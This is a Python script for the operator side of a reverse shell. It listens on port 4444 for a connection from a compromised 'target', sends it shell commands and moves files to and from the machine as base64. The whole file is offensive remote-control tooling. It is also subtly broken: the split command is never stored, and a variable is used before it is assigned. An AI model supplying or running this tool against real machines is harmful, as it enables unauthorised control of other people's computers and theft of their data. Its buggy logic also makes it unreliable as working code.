from colorama import Fore
import socket
import base64

class Listener(object):
    def __init__(self,ip):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,4444))
        listener.listen(0)
        print(Fore.YELLOW,"\n[*] Waitings for incomming connections!")
        self.connection,addr=listener.accept()
        print(Fore.BLUE,'\n[+] Got a connection from: ',str(addr))
    def execute_command(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)
    def write_file(self,path,content):
        with open(path,'w') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input(">>>")
            command.split(" ")
            try:
                if 'exit' in command:
                    self.connection.close()
                    exit()
                elif command[0]=='upload':
                    result=self.read_file(command[1])
                elif command[0]=='download' and 'Error' not in result:
                    result = self.write_file(command[1],result)
                result=self.execute_command(command)
                print(Fore.GREEN,result)
            except Exception:
                result='Error during command execution'
if __name__=='__main__':
    Listener(input("Enter the ip of the target: ")).run()